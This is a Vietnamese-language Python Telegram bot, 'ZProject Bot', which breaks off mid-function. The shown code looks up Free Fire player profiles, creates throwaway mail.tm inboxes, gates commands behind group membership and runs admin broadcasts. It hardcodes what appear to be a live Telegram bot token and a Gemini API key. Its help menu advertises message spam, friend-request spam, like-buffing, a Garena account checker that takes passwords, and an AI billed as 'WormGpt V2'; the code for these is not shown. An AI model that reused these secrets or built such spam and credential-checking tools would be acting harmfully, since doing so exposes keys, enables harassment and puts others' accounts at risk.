
import os
import time
import logging
import requests
import re
import base64
import uuid
import json
from datetime import datetime, timezone
from io import BytesIO
from PIL import Image
import random
import string
import threading
from telebot import types
from flask import Flask, request
from threading import Thread
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from types import SimpleNamespace

# --- Cấu hình logging ---
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[
        logging.FileHandler("bot.log"),
        logging.StreamHandler()
    ]
)

# --- Cấu hình chung ---
TOKEN = os.environ.get("BOT_TOKEN", "7539540916:AAENFBF2B2dyXLITmEC2ccgLYim2t9vxOQk")
ADMIN_ID = int(os.environ.get("ADMIN_ID", 5819094246))
APP_URL = os.environ.get("APP_URL", "https://zproject-111.onrender.com")

# THAY ĐỔI MỚI: ID của nhóm bắt buộc
REQUIRED_GROUP_ID = -1002538618385  # Thay bằng ID nhóm Telegram của bạn: https://t.me/zproject3
REQUIRED_GROUP_LINK = "https://t.me/zproject3" # Link mời tham gia nhóm

logging.info(f"APP_URL được cấu hình: {APP_URL}")

bot = telebot.TeleBot(TOKEN, threaded=True)
app = Flask(__name__)
START_TIME = time.time()

# Biến toàn cục và các Lock để bảo vệ truy cập đa luồng
USER_IDS = set()
GROUP_INFOS = []
user_data = {}
bot.feedback_messages = {}
bot.code_snippets = {}
bot.voice_map = {}
bot.mail_messages_state = {}
bot.noti_states = {}
interaction_count = 300

# Khởi tạo Locks cho các biến dùng chung
user_data_lock = threading.Lock()
feedback_messages_lock = threading.Lock()
code_snippets_lock = threading.Lock()
voice_map_lock = threading.Lock()
mail_messages_state_lock = threading.Lock()
interaction_count_lock = threading.Lock()
user_group_info_lock = threading.Lock()
noti_states_lock = threading.Lock()

# --- Cấu hình Requests với Retry và Timeout chung ---
session = requests.Session()
retries = Retry(total=3, backoff_factor=1, status_forcelist=[502, 503, 504])
adapter = HTTPAdapter(max_retries=retries)
session.mount("https://", adapter)
session.mount("http://", adapter)

DEFAULT_TIMEOUT_GLOBAL = 30
NGL_REQUEST_TIMEOUT = 15

class TimeoutSession(requests.Session):
    def request(self, method, url, **kwargs):
        if "zeusvr.x10.mx/ngl" in url:
            kwargs.setdefault('timeout', NGL_REQUEST_TIMEOUT)
        else:
            kwargs.setdefault('timeout', DEFAULT_TIMEOUT_GLOBAL)
        return super(TimeoutSession, self).request(method, url, **kwargs)

session = TimeoutSession()
session.mount("https://", adapter)
session.mount("http://", adapter)

# --- Cấu hình Gemini API và Prompt từ xa ---
GEMINI_API_KEY = "AIzaSyDpmTfFibDyskBHwekOADtstWsPUCbIrzE" # Nên dùng os.environ.get("GEMINI_API_KEY", "your_default_key")
GEMINI_URL = f"https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key={GEMINI_API_KEY}"
REMOTE_PROMPT_URL = "https://zcode.x10.mx/prompt.json"
REMOTE_LOG_HOST = "https://zcode.x10.mx/save.php"

# --- URL ảnh dùng trong bot ---
NGL_SUCCESS_IMAGE_URL = "https://i.ibb.co/fV1srXJ8/9885878c-2a4b-4246-ae2e-fda17d735e2d.jpg"
START_IMAGE_URL = "https://i.ibb.co/MkQ2pTjv/ca68c4b2-60dc-4eb1-9a20-ebf2cc5c577f.jpg"
NOTI_IMAGE_URL = "https://i.ibb.co/QvrB4zMB/ca68c4b2-2a4b-4246-ae2e-fda17d735e2d.jpg"
TUONGTAC_IMAGE_URL = "https://i.ibb.co/YF4yRCBP/1751301092916.png"

# --- Các hàm Dummy (Cần thay thế bằng logic thực tế của bạn) ---
def load_user_memory(user_id):
    # Cần triển khai logic tải bộ nhớ người dùng từ database/file
    return []

def save_user_memory(user_id, memory):
    # Cần triển khai logic lưu bộ nhớ người dùng vào database/file
    pass

def html_escape(text):
    return text.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;").replace("'", "&#039;")

class gTTS:
    def __init__(self, text, lang="vi", slow=False):
        self.text = text
        self.lang = lang
        self.slow = slow
    def save(self, filename):
        logging.info(f"Dummy gTTS: Saving '{self.text[:50]}...' to {filename}")
        # Đây là một hàm dummy. Bạn cần thay thế bằng thư viện gTTS thực tế
        # Ví dụ: from gtts import gTTS
        # tts = gTTS(text=self.text, lang=self.lang, slow=self.slow)
        # tts.save(filename)
        with open(filename, "wb") as f:
            f.write(b"dummy_audio_data") # Dữ liệu âm thanh dummy

# --- Các hàm hỗ trợ cho chức năng Mail.tm ---
def random_string(length=3):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def auto_delete_email(user_id):
    time.sleep(600)
    with user_data_lock:
        if user_id in user_data:
            del user_data[user_id]
            send_message_robustly(user_id, "⏰ Mail 10 phút của bạn đã hết hạn!")

def get_domain():
    try:
        r = session.get("https://api.mail.tm/domains")
        r.raise_for_status()
        domains = r.json()["hydra:member"]
        active_domains = [d for d in domains if d.get('isActive', False)]
        if active_domains:
            return random.choice(active_domains)["domain"]
        return None
    except requests.exceptions.RequestException as e:
        logging.error(f"Lỗi khi lấy domain từ Mail.tm: {e}")
        return None
    except Exception as e:
        logging.error(f"Lỗi không xác định khi lấy domain từ Mail.tm: {e}")
        return None

def create_temp_mail():
    domain = get_domain()
    if not domain:
        return None, None, None

    email = f"zproject_{random_string()}@{domain}"
    password = random_string(12)

    try:
        r_acc = session.post("https://api.mail.tm/accounts", json={
            "address": email,
            "password": password
        })
        r_acc.raise_for_status()

        r_token = session.post("https://api.mail.tm/token", json={
            "address": email,
            "password": password
        })
        r_token.raise_for_status()

        token = r_token.json()['token']
        return email, password, token
    except Exception as e:
        logging.error(f"Lỗi khi tạo/đăng nhập mail.tm: {e}")
        return None, None, None

def build_mail_buttons(user_id, state):
    markup = InlineKeyboardMarkup()
    if state == 'mail_info':
        markup.row(InlineKeyboardButton("📩 Xem Hộp Thư", callback_data=f"mailtm_inbox|{user_id}"))
    elif state == 'inbox':
        markup.row(
            InlineKeyboardButton("🔄 Làm Mới", callback_data=f"mailtm_refresh|{user_id}"),
            InlineKeyboardButton("↩️ Quay Lại", callback_data=f"mailtm_back|{user_id}")
        )
    return markup

# === Đồng bộ nhóm/người dùng từ API ===
def sync_chat_to_server(chat):
    if chat.type not in ["private", "group", "supergroup"]:
        return
    try:
        payload = {
            "id": chat.id,
            "type": chat.type,
            "title": getattr(chat, "title", ""),
            "username": getattr(chat, "username", "")
        }
        response = session.post("https://zcode.x10.mx/apizproject.php", json=payload, timeout=DEFAULT_TIMEOUT_GLOBAL)
        response.raise_for_status()
        logging.info(f"Synced chat {chat.id} to server")
    except Exception as e:
        logging.error(f"Error syncing chat {chat.id}: {e}")

def update_id_list_loop():
    global USER_IDS, GROUP_INFOS
    while True:
        try:
            response = session.get("https://zcode.x10.mx/group-idchat.json", timeout=DEFAULT_TIMEOUT_GLOBAL)
            response.raise_for_status()
            data = response.json()
            new_users = set(data.get("users", []))
            new_groups = data.get("groups", [])
            
            with user_group_info_lock:
                if new_users != USER_IDS or new_groups != GROUP_INFOS:
                    USER_IDS = new_users
                    GROUP_INFOS = new_groups
                    logging.info("Updated user and group lists")
        except Exception as e:
            logging.error(f"Error updating lists: {e}")
        time.sleep(10)

Thread(target=update_id_list_loop, daemon=True).start()

# --- Hàm hỗ trợ cho /ask và callbacks ---
def build_reply_button(user_id, question, reply_id=None):
    safe_q = (re.sub(r"[^\w\s]", "", question.strip())[:50] + '...') if len(question.strip()) > 50 else question.strip()
    
    markup = InlineKeyboardMarkup()
    buttons = [
        InlineKeyboardButton("🔁 Trả lời lại", callback_data=f"retry|{user_id}|{safe_q}")
    ]
    if reply_id:
        buttons.append(InlineKeyboardButton("🔊 Chuyển sang Voice", callback_data=f"tts|{user_id}|{reply_id}"))
    markup.row(*buttons)
    return markup

def increment_interaction_count(func):
    def wrapper(message, *args, **kwargs):
        global interaction_count
        with interaction_count_lock:
            interaction_count += 1
        return func(message, *args, **kwargs)
    return wrapper

def send_message_robustly(chat_id, text=None, photo=None, caption=None, reply_markup=None, parse_mode="HTML", reply_to_message_id=None, disable_web_page_preview=None):
    try:
        if photo:
            return bot.send_photo(
                chat_id=chat_id,
                photo=photo,
                caption=caption,
                reply_markup=reply_markup,
                parse_mode=parse_mode,
                reply_to_message_id=reply_to_message_id
            )
        else:
            return bot.send_message(
                chat_id=chat_id,
                text=text,
                reply_markup=reply_markup,
                parse_mode=parse_mode,
                reply_to_message_id=reply_to_message_id,
                disable_web_page_preview=disable_web_page_preview
            )
    except telebot.apihelper.ApiTelegramException as e:
        if "message to be replied not found" in str(e):
            logging.warning(f"Failed to reply to message {reply_to_message_id} in chat {chat_id}: {e}. Sending as new message.")
            if photo:
                return bot.send_photo(
                    chat_id=chat_id,
                    photo=photo,
                    caption=caption,
                    reply_markup=reply_markup,
                    parse_mode=parse_mode
                )
            else:
                return bot.send_message(
                    chat_id=chat_id,
                    text=text,
                    reply_markup=reply_markup,
                    parse_mode=parse_mode,
                    disable_web_page_preview=disable_web_page_preview
                )
        else:
            logging.error(f"Error sending message to chat {chat_id}: {e}")
            raise

# THAY ĐỔI: Hàm kiểm tra tư cách thành viên
def check_group_membership(group_id, user_id):
    try:
        member = bot.get_chat_member(group_id, user_id)
        # Status có thể là 'member', 'creator', 'administrator', 'restricted' (nếu bị hạn chế nhưng vẫn là thành viên), 'left', 'kicked'
        # Người dùng đã rời nhóm hoặc bị kick không được tính là thành viên
        return member.status in ['member', 'creator', 'administrator', 'restricted']
    except telebot.apihelper.ApiTelegramException as e:
        # Nếu bot không có quyền hoặc nhóm không tồn tại, thường sẽ raise lỗi.
        # Coi như không phải thành viên trong trường hợp này để an toàn.
        if "User not found" in str(e) or "Bad Request: user not in chat" in str(e) or "chat not found" in str(e):
            return False
        logging.error(f"Error checking group membership for user {user_id} in group {group_id}: {e}")
        return False
    except Exception as e:
        logging.error(f"Unexpected error checking group membership: {e}")
        return False

# THAY ĐỔI: Decorator để kiểm tra tư cách thành viên
def group_membership_required(func):
    def wrapper(message, *args, **kwargs):
        user_id = message.from_user.id
        
        # Luôn kiểm tra người dùng gửi tin nhắn có tham gia nhóm bắt buộc không
        if not check_group_membership(REQUIRED_GROUP_ID, user_id):
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("Join Group", url=REQUIRED_GROUP_LINK))
            
            # Nếu là chat riêng, gửi tin nhắn trực tiếp
            if message.chat.type == "private":
                return send_message_robustly(
                    message.chat.id,
                    text=f"⚠️ Vui lòng tham gia nhóm <a href='{REQUIRED_GROUP_LINK}'>ZProject Thông Báo</a> mới có thể sử dụng bot.",
                    parse_mode="HTML",
                    reply_to_message_id=message.message_id,
                    reply_markup=markup
                )
            # Nếu là chat nhóm, gửi tin nhắn trong nhóm
            else: # message.chat.type in ["group", "supergroup"]
                return send_message_robustly(
                    message.chat.id,
                    text=f"⚠️ <a href='tg://user?id={user_id}'>{message.from_user.first_name}</a> ơi, bạn cần tham gia nhóm <a href='{REQUIRED_GROUP_LINK}'>ZProject Thông Báo</a> để sử dụng lệnh này.",
                    parse_mode="HTML",
                    reply_to_message_id=message.message_id,
                    reply_markup=markup
                )
        
        # Nếu người dùng đã tham gia nhóm bắt buộc, cho phép chạy hàm gốc
        return func(message, *args, **kwargs)
    return wrapper

# === LỆNH XỬ LÝ TIN NHẮN ===

# Format timestamp
def format_timestamp(ts):
    try:
        timestamp_float = float(ts)
        return datetime.fromtimestamp(int(timestamp_float), tz=timezone.utc).strftime("%d-%m-%Y %H:%M:%S")
    except (ValueError, TypeError):
        return "N/A"

# Retry wrapper
def fetch_with_retry(url, retries=3, timeout=30):
    for attempt in range(retries):
        try:
            response = requests.get(url, timeout=timeout)
            if response.status_code == 200:
                return response.json()
            else:
                logging.warning(f"Attempt {attempt+1} received non-200 status code {response.status_code} for URL: {url}")
        except requests.exceptions.Timeout:
            logging.warning(f"Attempt {attempt+1} timed out for URL: {url}")
        except requests.exceptions.RequestException as e:
            logging.warning(f"Attempt {attempt+1} failed for URL: {url}\nError: {e}")
        time.sleep(1)
    return None

# Lệnh /in4ff
@bot.message_handler(commands=['in4ff'])
@increment_interaction_count
@group_membership_required
def handle_in4ff_command(message):
    parts = message.text.strip().split()

    if len(parts) != 3:
        send_message_robustly(
            message.chat.id,
            text="<blockquote>❌ <b>Định dạng không hợp lệ!</b> Sử dụng: <code>/in4ff {region} {uid}</code>\nVí dụ: <code>/in4ff vn 2211865132</code></blockquote>",
            parse_mode="HTML",
            reply_to_message_id=message.message_id
        )
        return

    region = html_escape(parts[1])
    uid = html_escape(parts[2])

    send_message_robustly(
        message.chat.id,
        text=f"<blockquote>⏳ <i>Đang tìm thông tin tài khoản cho UID</i> <code>{uid}</code>...</blockquote>",
        parse_mode="HTML",
        reply_to_message_id=message.message_id
    )

    info_url = f"https://info-ffayaacte.vercel.app/player-info?uid={uid}&region={region}"
    outfit_url = f"https://ff-outfit-image.vercel.app/outfit-image?uid={uid}&region={region}"

    info_res = fetch_with_retry(info_url, retries=3, timeout=30)
    
    if not info_res:
        send_message_robustly(
            message.chat.id,
            text="<blockquote>❌ <b>Không thể tìm nạp dữ liệu từ API sau 3 lần thử lại.</b> Vui lòng thử lại sau hoặc kiểm tra lại UID/Region.</blockquote>",
            parse_mode="HTML",
            reply_to_message_id=message.message_id
        )
        return
    
    if not isinstance(info_res, dict) or "basicInfo" not in info_res:
        error_msg = info_res.get("message", "Cấu trúc dữ liệu API trả về không hợp lệ hoặc thiếu thông tin cơ bản.") if isinstance(info_res, dict) else "Phản hồi từ API không phải là JSON hợp lệ."
        send_message_robustly(
            message.chat.id,
            text=f"<blockquote>❌ <b>Lỗi dữ liệu từ API:</b> <i>{html_escape(error_msg)}</i>\n"
                 f"Vui lòng kiểm tra lại UID hoặc liên hệ hỗ trợ nếu lỗi này tiếp tục xảy ra.</blockquote>",
            parse_mode="HTML",
            reply_to_message_id=message.message_id
        )
        logging.error(f"API returned invalid data for UID {uid}, Region {region}: {info_res}")
        return

    basic = info_res.get("basicInfo", {})
    profile = info_res.get("profileInfo", {})
    clan = info_res.get("clanBasicInfo", {})
    captain = info_res.get("captainBasicInfo", {})
    pet = info_res.get("petInfo", {})
    social = info_res.get("socialInfo", {})

    def get_safe_value(data_dict, key, default="N/A"):
        value = data_dict.get(key, default)
        if isinstance(value, list):
            return ", ".join(map(str, value)) if value else default
        return html_escape(str(value))

    msg = f"""
<blockquote><b>━━━━━━━━━━━━━━━━━━━━</b>
<b>👑 THÔNG TIN TÀI KHOẢN CƠ BẢN</b>
<b>━━━━━━━━━━━━━━━━━━━━</b>
👤 <b>Tên:</b> <code>{get_safe_value(basic, "nickname")}</code>
🆔 <b>UID:</b> <code>{get_safe_value(basic, "accountId")}</code>
📈 <b>Cấp độ:</b> <code>{get_safe_value(basic, "level")}</code>
🌍 <b>Khu vực:</b> <code>{get_safe_value(basic, "region")}</code>
❤️ <b>Lượt thích:</b> <code>{get_safe_value(basic, "liked")}</code>
⚔️ <b>Điểm Uy Tín:</b> <code>{get_safe_value(basic, "rankingPoints")}</code>
⭐ <b>Người nổi tiếng:</b> <code>{get_safe_value(basic, "showRank")}</code>
🎖 <b>Huy hiệu Evo:</b> <code>{get_safe_value(basic, "badgeId")}</code>
🎗 <b>Chức Vụ:</b> <code>{get_safe_value(basic, "title")}</code>
✍️ <b>Tiểu Sử:</b> <i>{get_safe_value(social, "signature")}</i>

<b>━━━━━━━━━━━━━━━━━━━━</b>
<b>🎮 HOẠT ĐỘNG TÀI KHOẢN</b>
<b>━━━━━━━━━━━━━━━━━━━━</b>
📦 <b>Phiên bản OB:</b> <code>{get_safe_value(basic, "releaseVersion")}</code>
🔥 <b>Fire Pass:</b> <code>{get_safe_value(basic, "seasonId")}</code>
🎯 <b>Huy hiệu BP:</b> <code>{get_safe_value(basic, "badgeCnt")}</code>
🏆 <b>Xếp hạng BR:</b> <code>{get_safe_value(basic, "rank")}</code>
⚡ <b>Điểm CS:</b> <code>{get_safe_value(basic, "csRankingPoints")}</code>
📅 <b>Ngày tạo:</b> <code>{format_timestamp(basic.get("createAt", 0))}</code>
⏱ <b>Lần đăng nhập cuối:</b> <code>{format_timestamp(basic.get("lastLoginAt", 0))}</code>

<b>━━━━━━━━━━━━━━━━━━━━</b>
<b>🧍 TỔNG QUAN TÀI KHOẢN</b>
<b>━━━━━━━━━━━━━━━━━━━━</b>
🖼 <b>ID ảnh đại diện:</b> <code>{get_safe_value(profile, "avatarId")}</code>
🎌 <b>ID biểu ngữ:</b> <code>{get_safe_value(basic, "bannerId")}</code>
📍 <b>ID ghim:</b> <code>{get_safe_value(basic, "headPic")}</code>
🎯 <b>Kỹ năng:</b> <code>{get_safe_value(profile, "equipedSkills")}</code>
🔫 <b>ID skin súng:</b> <code>{get_safe_value(basic, "weaponSkinShows")}</code>
🎬 <b>ID hoạt ảnh:</b> <code>{get_safe_value(profile, "isSelected")}</code>
✨ <b>Hoạt ảnh biến đổi:</b> <code>{get_safe_value(profile, "isSelectedAwaken")}</code>

<b>━━━━━━━━━━━━━━━━━━━━</b>
<b>🐾 THÔNG TIN THÚ CƯNG</b>
<b>━━━━━━━━━━━━━━━━━━━━</b>
🐶 <b>Đang trang bị?:</b> <code>{get_safe_value(pet, "isSelected")}</code>
📛 <b>Pet ID:</b> <code>{get_safe_value(pet, "id")}</code>
🦴 <b>Skin ID:</b> <code>{get_safe_value(pet, "skinId")}</code>
🔋 <b>Kinh nghiệm:</b> <code>{get_safe_value(pet, "exp")}</code>
📊 <b>Cấp độ:</b> <code>{get_safe_value(pet, "level")}</code>

<b>━━━━━━━━━━━━━━━━━━━━</b>
<b>🛡️ THÔNG TIN QUÂN ĐOÀN</b>
<b>━━━━━━━━━━━━━━━━━━━━</b>
🏰 <b>Tên QUÂN ĐOÀN:</b> <code>{get_safe_value(clan, "clanName")}</code>
🆔 <b>ID QUÂN ĐOÀN:</b> <code>{get_safe_value(clan, "clanId")}</code>
⚙️ <b>Cấp độ:</b> <code>{get_safe_value(clan, "clanLevel")}</code>
👥 <b>Thành viên:</b> <code>{get_safe_value(clan, "memberNum")}</code>

<b>━━━━━━━━━━━━━━━━━━━━</b>
<b>👑 THÔNG TIN CHỦ QUÂN ĐOÀN</b>
<b>━━━━━━━━━━━━━━━━━━━━</b>
🧍 <b>Tên:</b> <code>{get_safe_value(captain, "nickname")}</code>
🆔 <b>UID:</b> <code>{get_safe_value(captain, "accountId")}</code>
📈 <b>Cấp độ:</b> <code>{get_safe_value(captain, "level")}</code>
📅 <b>Ngày tạo:</b> <code>{format_timestamp(captain.get("createAt", 0))}</code>
⏱ <b>Lần đăng nhập cuối:</b> <code>{format_timestamp(captain.get("lastLoginAt", 0))}</code>
🎗 <b>Chức Vụ:</b> <code>{get_safe_value(captain, "title")}</code>
🎯 <b>Huy hiệu BP:</b> <code>{get_safe_value(captain, "badgeCnt")}</code>
🏆 <b>Điểm BR:</b> <code>{get_safe_value(captain, "rankingPoints")}</code>
⚡ <b>Điểm CS:</b> <code>{get_safe_value(captain, "csRankingPoints")}</code>

━━━━━━━━━━━━━━━━━━━━
<i>👑 ADMIN:</i> @zproject2  
⚡ <i>GROUP:</i> <a href="https://t.me/zproject3">Tham gia ngay</a>
━━━━━━━━━━━━━━━━━━━━
</blockquote>
"""
    send_message_robustly(message.chat.id, msg, parse_mode="HTML", reply_to_message_id=message.message_id)

    try:
        head_response = requests.head(outfit_url, timeout=60)

        logging.info(f"HEAD response for outfit_url: {outfit_url}")
        logging.info(f"Status Code: {head_response.status_code}")
        logging.info(f"Content-Type: {head_response.headers.get('Content-Type')}")

        if head_response.status_code == 200 and head_response.headers.get('Content-Type', '').startswith('image/'):
            send_message_robustly(
                chat_id=message.chat.id,
                photo=outfit_url,
                caption=f"<blockquote>🖼️ <b>Hình ảnh trang phục của</b> <code>{get_safe_value(basic, 'nickname')}</code></blockquote>",
                parse_mode="HTML",
                reply_to_message_id=message.message_id
            )
        else:
            error_details = f"Status: {head_response.status_code}, Content-Type: {head_response.headers.get('Content-Type', 'N/A')}"
            send_message_robustly(
                message.chat.id,
                text=f"<blockquote>⚠️ <b>Hình ảnh trang phục không có sẵn hoặc định dạng không hợp lệ.</b> Chi tiết: <code>{html_escape(error_details)}</code></blockquote>",
                parse_mode="HTML",
                reply_to_message_id=message.message_id
            )
            logging.warning(f"Outfit image not available or invalid format for UID {uid}, Region {region}. Details: {error_details}")

    except requests.exceptions.RequestException as e:
        logging.error(f"Failed to check or send outfit image for UID {uid}: {e}")
        send_message_robustly(
            message.chat.id,
            text="<blockquote>⚠️ <b>Không thể tìm nạp hoặc gửi hình ảnh trang phục do lỗi kết nối.</b></blockquote>",
            parse_mode="HTML",
            reply_to_message_id=message.message_id
        )

@bot.message_handler(commands=["start"])
@increment_interaction_count
@group_membership_required
def start_cmd(message):
    logging.info(f"Received /start from user {message.from_user.id} in chat {message.chat.id}")
    sync_chat_to_server(message.chat)
    markup = InlineKeyboardMarkup()
    markup.add(
        InlineKeyboardButton("👤 Admin", url="https://t.me/zproject2"),
        InlineKeyboardButton("📢 Thông Báo", url=REQUIRED_GROUP_LINK),
        InlineKeyboardButton("💬 Chat", url="https://t.me/zproject4")
    )
    send_message_robustly(
        message.chat.id,
        photo=START_IMAGE_URL,
        caption="<blockquote><b>🚀 ZProject Bot</b></blockquote>\n\n"
                "<blockquote><b>Chào mừng bạn đến với Dịch Vụ Zproject Bot Được Make Bởi @zproject2\n "
                "● Chúng Tôi Có Các Dịch Vụ Như Treo Bot 24/7 Giá Cực Rẻ Hơn VPS và Máy Ảo \n● Bạn Có Thể Liên Hệ Telegram @zproject2.\n"
                "--> Gõ /phanhoi Để Phản Hồi Lỗi Hoặc Cần Cải Tiến Gì Đó Cho Bot, Ví Dụ <code>/phanhoi Lỗi Ở Lệnh Ask 503.</code>\n"
                "--> Gõ /help để xem danh sách các lệnh.</b></blockquote>",
        reply_markup=markup,
        parse_mode="HTML",
        reply_to_message_id=message.message_id
    )

@bot.message_handler(commands=["help"])
@increment_interaction_count
@group_membership_required
def help_command(message):
    logging.info(f"Received /help from user {message.from_user.id} in chat {message.chat.id}")
    sync_chat_to_server(message.chat)
    help_text = (
        "<blockquote>📚 Menu Lệnh ZProject Bot</blockquote>\n\n"
        "<blockquote>•  <code>/start</code> - Start Zproject Bot</blockquote>\n"
        "<blockquote>•  <code>/help</code>  - Show Menu Zproject Bot</blockquote>\n"
        "<blockquote>•  <code>/time</code>  - Uptime Zproject Bot</blockquote>\n"
        "<blockquote>•  <code>/ask &lt;câu hỏi&gt;</code> - Hỏi AI Được Tích Hợp WormGpt V2</blockquote>\n"
        "<blockquote>•  <code>/checkgrn &lt;USERNAME PASSWORD&gt;</code> - Check Thông Tin Acc Garena</blockquote>\n"
        "<blockquote>•  <code>/ngl &lt;username&gt; &lt;tin_nhắn&gt; &lt;số_lần&gt;</code> - Spam Ngl</blockquote>\n"
        "<blockquote>•  <code>/like &lt;UID FF&gt;</code> - Buff Like Free Fire</blockquote>\n"
        "<blockquote>•  <code>/kbff &lt;UID FF&gt;</code> - Spam Kết Bạn Free Fire</blockquote>\n"
        "<blockquote>•  <code>/in4ff &lt;REGION UID FF&gt;</code> - Check info Account FF</blockquote>\n"
        "<blockquote>•  <code>/tuongtac</code> - Xem tổng số lượt tương tác của bot</blockquote>\n"
        "<blockquote>•  <code>/phanhoi</code> - Gửi Phản Hồi Lỗi Hoặc Chức Năng Cần Cải Tiến</blockquote>\n"
        "<blockquote>•  <code>/ping</code> - Xem Ping Sever Bot</blockquote>\n"
        "<blockquote>•  <code>/mail10p</code> - Tạo mail 10 phút dùng 1 lần</blockquote>\n"
        "<blockquote>•  <code>/hopthu</code> - Xem hộp thư của mail 10 phút đã tạo</blockquote>\n"
        "<blockquote>•  <code>/xoamail10p</code> - Xóa mail 10 phút hiện tại của bạn</blockquote>"
    )
    send_message_robustly(
        chat_id=message.chat.id,
        photo=NGL_SUCCESS_IMAGE_URL,
        caption=help_text,
        parse_mode="HTML",
        reply_to_message_id=message.message_id
    )


@bot.message_handler(commands=["time"])
@increment_interaction_count
@group_membership_required
def time_cmd(message):
    logging.info(f"Received /time from user {message.from_user.id} in chat {message.chat.id}")
    sync_chat_to_server(message.chat)
    now = time.time()
    seconds = int(now - START_TIME)
    days = seconds // 86400
    hours = (seconds % 86400) // 3600
    minutes = (seconds % 3600) // 60
    sec = seconds % 60
    send_message_robustly(
        message.chat.id,
        text=f"<blockquote>⏱️ Bot đã hoạt động được:\n<b>{days} ngày {hours} giờ {minutes} phút {sec} giây</b></blockquote>",
        parse_mode="HTML",
        reply_to_message_id=message.message_id
    )

@bot.message_handler(commands=["tuongtac"])
@increment_interaction_count
@group_membership_required
def tuongtac_command(message):
    logging.info(f"Received /tuongtac from user {message.from_user.id} in chat {message.chat.id}")
    sync_chat_to_server(message.chat)
    
    with interaction_count_lock:
        current_interaction_count = interaction_count

    reply_text = (
        f"<b>📊 THỐNG KÊ ZPROJECT BOT</b>\n\n"
        f"● Tổng Thống Kê Zproject Bot.\n\n"
        f"<b>Tổng số lượt tương tác:</b> <code>{current_interaction_count}</code>\n"
        f"<i>Lưu ý: Số Lượt Tương Tác Càng Cao Chứng Tỏ Độ Uy Tín Của Bot 🎉.</i>"
    )
    
    send_message_robustly(
        chat_id=message.chat.id,
        photo=TUONGTAC_IMAGE_URL,
        caption=reply_text,
        parse_mode="HTML",
        reply_to_message_id=message.message_id
    )

# Thêm vào sau các lệnh hiện có của bạn, ví dụ: sau lệnh /noti hoặc /sever

@bot.message_handler(commands=["data"])
@increment_interaction_count
def get_bot_data(message):
    logging.info(f"Received /data from user {message.from_user.id} in chat {message.chat.id}")

    # Kiểm tra quyền Admin
    if message.from_user.id != ADMIN_ID:
        return send_message_robustly(message.chat.id, text="🚫 Bạn không có quyền sử dụng lệnh này.", parse_mode="HTML", reply_to_message_id=message.message_id)

    # Sử dụng lock để đảm bảo an toàn luồng khi truy cập các biến toàn cục
    with user_group_info_lock:
        current_users = list(USER_IDS)
        current_groups = list(GROUP_INFOS)

    response_text = "<b>📊 DỮ LIỆU NGƯỜI DÙNG & NHÓM CỦA BOT</b>\n\n"

    # Thông tin Người dùng
    if current_users:
        response_text += "<b>👤 DANH SÁCH NGƯỜI DÙNG:</b>\n"
        for user_id in current_users:
            try:
                # Cố gắng lấy thông tin chi tiết về người dùng
                # Lưu ý: bot.get_chat_member chỉ hoạt động nếu người dùng là thành viên của chat mà tin nhắn được gửi đến,
                # hoặc nếu đó là chat riêng của bot với người dùng.
                # Để có tên người dùng một cách đáng tin cậy, bạn cần lưu trữ nó khi người dùng tương tác lần đầu.
                # Giả định đơn giản: nếu có trong USER_IDS, đó là một user hợp lệ.
                # Để lấy tên, bạn có thể cần một API hoặc DB lưu trữ User_name/first_name.
                # Hiện tại, chỉ hiển thị ID.
                # Nếu bạn muốn hiển thị tên, bạn cần một cơ chế lưu trữ tên người dùng khi họ /start hoặc nhắn tin.
                response_text += f"- ID: <code>{user_id}</code>\n"
            except Exception as e:
                logging.warning(f"Không thể lấy chi tiết người dùng {user_id}: {e}")
                response_text += f"- ID: <code>{user_id}</code> (Không thể lấy tên)\n"
        response_text += f"<i>Tổng số người dùng: {len(current_users)}</i>\n\n"
    else:
        response_text += "<i>Hiện không có dữ liệu người dùng nào.</i>\n\n"

    response_text += "---\n\n"

    # Thông tin Nhóm
    if current_groups:
        response_text += "<b>👥 DANH SÁCH NHÓM:</b>\n"
        for group in current_groups:
            group_id = group.get("id", "N/A")
            group_title = html_escape(group.get("title", "Không rõ tên nhóm"))
            group_username = group.get("username", "")

            group_display = f"📌 <b>{group_title}</b> (ID: <code>{group_id}</code>)\n"
            if group_username:
                group_display += f"🔗 Link: https://t.me/{group_username}\n"
            else:
                group_display += "🔗 Link: <i>Không có username</i>\n"
            response_text += group_display
        response_text += f"<i>Tổng số nhóm: {len(current_groups)}</i>\n"
    else:
        response_text += "<i>Hiện không có dữ liệu nhóm nào.</i>\n"

    response_text += "\n<b>━━━━━━━━━━━━━━━━━━━━</b>\n" \
                     "<i>👑 ADMIN:</i> @zproject2\n" \
                     "⚡ <i>GROUP:</i> <a href=\"https://t.me/zproject3\">Tham gia ngay</a>\n" \
                     "<b>━━━━━━━━━━━━━━━━━━━━</b>"

    send_message_robustly(
        message.chat.id,
        text=response_text,
        parse_mode="HTML",
        disable_web_page_preview=True,
        reply_to_message_id=message.message_id
    )


@bot.message_handler(commands=["noti"])
@increment_interaction_count
# Lệnh /noti không cần group_membership_required vì nó là lệnh riêng cho admin
def send_noti(message):
    logging.info(f"Received /noti from user {message.from_user.id} in chat {message.chat.id}")
    if message.from_user.id != ADMIN_ID:
        return send_message_robustly(message.chat.id, text="🚫 Bạn không có quyền sử dụng lệnh này.", parse_mode="HTML", reply_to_message_id=message.message_id)

    text = message.text.replace("/noti", "").strip()

    photo_file_id = None
    if message.reply_to_message and message.reply_to_message.photo:
        photo_file_id = message.reply_to_message.photo[-1].file_id

    if not text and not photo_file_id:
        return send_message_robustly(message.chat.id, text="⚠️ Sử dụng: <code>/noti &lt;nội dung&gt;</code> hoặc reply vào ảnh và dùng <code>/noti &lt;nội dung&gt;</code>.", parse_mode="HTML", reply_to_message_id=message.message_id)

    notify_caption = f"<i>[!] THÔNG BÁO TỪ ADMIN DEPZAI CUTO</i>\n\n<blockquote>{text}</blockquote>" if text else "<b>[!] THÔNG BÁO</b>"

    with noti_states_lock:
        bot.noti_states[message.chat.id] = {
            'caption': notify_caption,
            'photo_file_id': photo_file_id,
            'original_message_id': message.message_id,
            'button_text': None,
            'button_url': None
        }

    markup = InlineKeyboardMarkup()
    markup.add(
